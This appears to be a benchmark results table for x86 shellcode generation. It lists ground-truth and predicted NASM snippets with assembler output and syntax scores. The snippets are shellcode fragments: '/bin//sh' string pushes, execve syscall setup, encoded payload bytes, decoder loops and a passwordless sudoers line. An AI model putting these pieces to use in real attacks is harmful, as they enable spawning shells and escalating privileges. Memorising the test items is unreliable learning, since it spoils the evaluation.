Ground Truth Snippets;Predicted Snippets;NASM Output;Score Syntax
push edx;push edx \\n push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x;"assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:6: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:7: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:8: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:9: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:10: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:11: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:12: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:13: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:14: warning: word data exceeds bounds [-w+number-overflow]
";1
encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87;encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87;Matched with ground truth;1
next_addr:;_next_addr:;No compiler errors;1
push word 100;push word 100;Matched with ground truth;1
mov esi, eax;mov esi, eax;Matched with ground truth;1
push 0x68732f6e \\n push 0x69622f2f \\n mov ebx, esp;push bin/sh \\n push ebx;"assembly_instruction.asm:1: error: symbol `bin' not defined
";0
push eax \\n push edx;push eax \\n push edx;Matched with ground truth;1
inc ax;add ax, 1;No compiler errors;1
push 0x65782e2f \\n push 0x706d742f;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;"assembly_instruction.asm:1: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:6: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:7: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:8: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:9: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:10: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:11: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:12: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:13: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:14: warning: word data exceeds bounds [-w+number-overflow]
";1
push word 0x462d;push word 0x462d;Matched with ground truth;1
mov ecx, esp;mov ecx, esp;Matched with ground truth;1
lea ecx, [eax];push [\\n pop eax \\n pop ecx;"assembly_instruction.asm:1: error: expression syntax error
";0
sub eax, eax;xor eax, eax;No compiler errors;1
xor eax, esi;xor eax, esi;Matched with ground truth;1
jns loopinghere;jns loopinghere;Matched with ground truth;1
inc edx;inc edx;Matched with ground truth;1
mov bl,0x4;mov bl, 0x4;Matched with ground truth;1
duploop:;duploop:;Matched with ground truth;1
pop esi;pop esi;Matched with ground truth;1
push word 0x0a;push af_inet6;"assembly_instruction.asm:1: error: symbol `af_inet6' not defined
";1
db 'all all=(all) nopasswd: all', 0xa;db 'all all=(all) nopasswd: all';No compiler errors;1
jmp short path;jmp short path;Matched with ground truth;1
mov[esi+39], ebx;pop ebx;No compiler errors;1
div ebx;div ebx;Matched with ground truth;1
push ecx;push ecx;Matched with ground truth;1
add edi, edi;add edi, edi;Matched with ground truth;1
zero1a:;_zero1a:;No compiler errors;1
cmp edx, 0x43 \\n ja loop \\n push edx;cmp edx, 0x43 \\n jge loop \\n push edx;"assembly_instruction.asm:2: error: symbol `loop' not defined
";1
add byte [esi], 0x10;add byte [esi], 0x10;Matched with ground truth;1
section .text;section;"assembly_instruction.asm:1: warning: multi-line macro `section' exists, but not taking 0 parameters [-w+macro-params-multi]
assembly_instruction.asm:1: warning: label alone on a line without a colon might be in error [-w+label-orphan]
";1
mov ecx, m_src3;mov ecx, m_src3;Matched with ground truth;1
push word 0x3582;push word 0x68732f2f \\n push word 0x6e69622f \\n push word 0x69622f \\n push word 0x69622f;"assembly_instruction.asm:1: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: word data exceeds bounds [-w+number-overflow]
";1
mov byte [esi+14],al;mov byte [esi+14], al;Matched with ground truth;1
next_addr:;next_addr:;Matched with ground truth;1
mov bl, 0x01;mov bl, sys_socket;"assembly_instruction.asm:1: error: symbol `sys_socket' not defined
";1
pop esi;pop esi;Matched with ground truth;1
dec ecx \\n jns loop;dec ecx \\n jns loop;Matched with ground truth;1
xor byte [esi+1], dl;xor [esi], dl;No compiler errors;1
cmp cl, dl \\n je encodedshellcode;cmp cl, dl \\n je _encodedshellcode;"assembly_instruction.asm:2: error: symbol `_encodedshellcode' not defined
";1
encoded_shellcode: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80;0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80 db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80;"assembly_instruction.asm:1: error: label or instruction expected at start of line
";0
lea ecx, [esp];mov ecx, esp;No compiler errors;1
xor eax,eax \\n xor ebx,ebx;xor eax, eax \\n mul eax;No compiler errors;1
mov edx, 2;mov edx, 2;Matched with ground truth;1
mov esi, esp;mov esi, esp;Matched with ground truth;1
mov ebx, esp;mov ebx, esp;Matched with ground truth;1
sub eax, [esp];sub eax, esp;No compiler errors;1
mov cx, 0x301;mov cx, 0x301;Matched with ground truth;1
hello: db 'hello world!',10;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov linefeed, esp;"assembly_instruction.asm:1: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:6: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:7: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:8: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:9: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:10: error: symbol `linefeed' not defined
";0
cmp cl, 0xff \\n jne dup2;cmp cl, 0xff, \\n jne _dup2;"assembly_instruction.asm:2: error: symbol `_dup2' not defined
";1
inc esi \\n inc esi;inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc;"assembly_instruction.asm:26: error: invalid combination of opcode and operands
";0
lea ebx, [edx+0x4];lea ebx, [edx+0x4];Matched with ground truth;1
shr dl, 4;shr dl, 4;Matched with ground truth;1
xor eax, 0x6e696230;xor eax, 0x6e696230;Matched with ground truth;1
call [esp];int 0x80;No compiler errors;1
mov edi, 0xaaaa9090;mov edi, 0xaaaa9090;Matched with ground truth;1
jb next;inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0;"assembly_instruction.asm:1: error: symbol `var0' not defined
assembly_instruction.asm:2: error: symbol `var0' not defined
assembly_instruction.asm:3: error: symbol `var0' not defined
assembly_instruction.asm:4: error: symbol `var0' not defined
assembly_instruction.asm:5: error: symbol `var0' not defined
assembly_instruction.asm:6: error: symbol `var0' not defined
assembly_instruction.asm:7: error: symbol `var0' not defined
assembly_instruction.asm:8: error: symbol `var0' not defined
assembly_instruction.asm:9: error: symbol `var0' not defined
assembly_instruction.asm:10: error: symbol `var0' not defined
assembly_instruction.asm:11: error: symbol `var0' not defined
assembly_instruction.asm:12: error: symbol `var0' not defined
assembly_instruction.asm:13: error: symbol `var0' not defined
assembly_instruction.asm:14: error: symbol `var0' not defined
assembly_instruction.asm:15: error: symbol `var0' not defined
assembly_instruction.asm:16: error: symbol `var0' not defined
assembly_instruction.asm:17: error: symbol `var0' not defined
";0
filecontents: resb 128;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov filecontents, esp;"assembly_instruction.asm:1: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:6: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:7: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:8: error: symbol `filecontents' not defined
";0
mov al, 23;mov al, 23;Matched with ground truth;1
mov edx, eax;xchg edx, eax;No compiler errors;1
cmp al, cl \\n jne short decode \\n jmp shellcode;cmp al, cl \\n jne short decode \\n jmp shellcode;Matched with ground truth;1
push dword eax;push dword eax;Matched with ground truth;1
mov bl, 5;push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov bl, esp;"assembly_instruction.asm:1: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:6: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:7: error: invalid combination of opcode and operands
";0
pop ecx;pop we;"assembly_instruction.asm:1: error: symbol `we' not defined
";0
push eax \\n push edx \\n push ecx \\n push ebx \\n mov edi, esp;push eax \\n push edx \\n push ecx \\n push ebx \\n mov edi, esp;Matched with ground truth;1
mov ecx, esp;mov ecx, esp;Matched with ground truth;1
call write;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;"assembly_instruction.asm:1: error: symbol `zero68732f' not defined
assembly_instruction.asm:2: error: symbol `zero68732f' not defined
assembly_instruction.asm:3: error: symbol `zero68732f' not defined
assembly_instruction.asm:4: error: symbol `zero68732f' not defined
assembly_instruction.asm:5: error: symbol `zero6e69622f' not defined
assembly_instruction.asm:6: error: symbol `zero69622f' not defined
assembly_instruction.asm:7: error: symbol `zero69622f' not defined
assembly_instruction.asm:8: error: symbol `zero69622f' not defined
assembly_instruction.asm:9: error: symbol `zero69622f' not defined
assembly_instruction.asm:10: error: symbol `zero69622f' not defined
assembly_instruction.asm:11: error: symbol `zero69622f' not defined
assembly_instruction.asm:12: error: symbol `zero69622f' not defined
assembly_instruction.asm:13: error: symbol `zero69622f' not defined
assembly_instruction.asm:14: error: symbol `zero69622f' not defined
";1
push 10 \\n mov eax, esp;push 10 \\n mov eax, esp;Matched with ground truth;1
xchg ebx, eax;xchg eax, ebx;No compiler errors;1
mov ecx, esp;mov ecx, [args];"assembly_instruction.asm:1: error: symbol `args' not defined
";1
mov ecx, esp;mov ecx, esp;Matched with ground truth;1
mov esi, esp;mov esi, esp;Matched with ground truth;1
lea ecx, [esp];mov ebx, esp;No compiler errors;1
lea edi, [ebx];lea edi, [ebx];Matched with ground truth;1
xor dl, 0xbb;xor dl, 0xbb;Matched with ground truth;1
mov cl, len;mov cl, 0x68732f2f \\n add cl, 0x68732f \\n add cl, 0x6e69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x6e69622f \\n add cl, 0x6e69622f \\n add cl, 0x69622f2f \\n add cl, 0x6;"assembly_instruction.asm:1: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:6: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:7: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:8: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:9: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:10: warning: byte data exceeds bounds [-w+number-overflow]
";1
mov cl, 0x2;mov cl, 0x2;Matched with ground truth;1
mov eax, msg3;mov eax, msg3;Matched with ground truth;1
push 0x78;push 0x78;Matched with ground truth;1
mov al, 11 \\n int 0x80;int 0x80;No compiler errors;1
sub bx, dx;sub bx, dx;Matched with ground truth;1
push 0x61702f2f \\n push 0x6374652f \\n mov eax, esp;push 0x61702f2f \\n push 0x6374652f \\n mov eax, esp;Matched with ground truth;1
mov edi, hexstr;mov edi, hexstr;Matched with ground truth;1
jmp edi;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;"assembly_instruction.asm:1: error: symbol `zero68732f' not defined
assembly_instruction.asm:2: error: symbol `zero68732f' not defined
assembly_instruction.asm:3: error: symbol `zero68732f' not defined
assembly_instruction.asm:4: error: symbol `zero68732f' not defined
assembly_instruction.asm:5: error: symbol `zero6e69622f' not defined
assembly_instruction.asm:6: error: symbol `zero69622f' not defined
assembly_instruction.asm:7: error: symbol `zero69622f' not defined
assembly_instruction.asm:8: error: symbol `zero69622f' not defined
assembly_instruction.asm:9: error: symbol `zero69622f' not defined
assembly_instruction.asm:10: error: symbol `zero69622f' not defined
assembly_instruction.asm:11: error: symbol `zero69622f' not defined
assembly_instruction.asm:12: error: symbol `zero69622f' not defined
assembly_instruction.asm:13: error: symbol `zero69622f' not defined
assembly_instruction.asm:14: error: symbol `zero69622f' not defined
";1
variablename3: resd 1;push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n;"assembly_instruction.asm:18: error: comma, colon, decorator or end of line expected after operand
";0
jae _start-0x24;jns _start-0x24;"assembly_instruction.asm:1: error: symbol `_start' not defined
";1
push 0x2;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;"assembly_instruction.asm:1: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:6: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:7: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:8: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:9: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:10: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:11: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:12: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:13: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:14: warning: word data exceeds bounds [-w+number-overflow]
";1
push eax \\n push 0x68732f2f \\n push 0x6e69622f \\n push ebx, esp \\n mov edx, eax \\n mov al, 0xb \\n int 0x80;push temrinated \\n push '/bin//sh' \\n push ebx \\n push edx \\n push temrinated \\n push '/bin//sh' \\n push ebx \\n mov edx, esp;"assembly_instruction.asm:1: error: symbol `temrinated' not defined
assembly_instruction.asm:2: warning: character constant too long [-w+other]
assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: error: symbol `temrinated' not defined
assembly_instruction.asm:6: warning: character constant too long [-w+other]
assembly_instruction.asm:6: warning: word data exceeds bounds [-w+number-overflow]
";0
xor ax, bx \\n jz call_decoded;xor ax, bx \\n jz call decoded;"assembly_instruction.asm:2: error: comma, colon, decorator or end of line expected after operand
";0
mov edx, 0x1234567;mov edx, 0x1234567;Matched with ground truth;1
mov [1000h], ax;mov ax, 1000h;No compiler errors;1
pop esi;pop esi;Matched with ground truth;1
call_egghunter:;call_egghunter:;Matched with ground truth;1
mov ebx, type var3;mov ebx, var3;"assembly_instruction.asm:1: error: symbol `var3' not defined
";1
open:;open_label:;No compiler errors;1
mov ecx, esp;mov ecx, esp;Matched with ground truth;1
switch:;_switch:;No compiler errors;1
mov byte al, 0xa4;mov al, byte [0xa4];No compiler errors;1
2:;numeric 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f;"assembly_instruction.asm:1: error: parser: instruction expected
";0
push 0xb \\n pop eax;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n mov eax, esp;"assembly_instruction.asm:1: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: word data exceeds bounds [-w+number-overflow]
";1
mov al, 0xb \\n int 0x80;mov al, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f;"assembly_instruction.asm:1: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: warning: byte data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:6: warning: byte data exceeds bounds [-w+number-overflow]
";1
cmp BYTE al, 2 \\n je do_inject \\n jmp while;cmp al, 2 \\n jne while \\n jmp do_inject;"assembly_instruction.asm:2: error: symbol `while' not defined
assembly_instruction.asm:3: error: symbol `do_inject' not defined
";1
pop ebx;pop ebx;Matched with ground truth;1
push 0x10;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;"assembly_instruction.asm:1: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:2: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:3: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:4: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:5: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:6: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:7: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:8: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:9: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:10: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:11: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:12: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:13: warning: word data exceeds bounds [-w+number-overflow]
assembly_instruction.asm:14: warning: word data exceeds bounds [-w+number-overflow]
";1
push byte 49;push byte 49;Matched with ground truth;1
mov al, 0x58;push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n mov ebx, esp;No compiler errors;1
xor eax, eax \\n push eax;push edx;No compiler errors;1
cmp eax, ebx \\n je child;cmp eax, ebx \\n jne child;"assembly_instruction.asm:2: error: symbol `child' not defined
";1
mov ax, 8h;mov ax, 8h;Matched with ground truth;1
push 0x2f2f2f2f \\n mov ecx, esp;push 0x2f2f2f2f \\n mov ecx, esp;Matched with ground truth;1
"call shellcode \\n message db ""/bin/sh""";push of /bin/sh \\n push eip \\n mov shellcode_label, esp;"assembly_instruction.asm:1: error: symbol `of' not defined
assembly_instruction.asm:2: error: symbol `eip' not defined
assembly_instruction.asm:3: error: symbol `shellcode_label' not defined
";0
cmp bl, 0x1f;cmp bl, 0x1f;Matched with ground truth;1
decoder: \\n pop esi \\n mov edi, esi;pop esi \\n mov edi, [esi];No compiler errors;1
push 0x68736162;push 0x68736162;Matched with ground truth;1
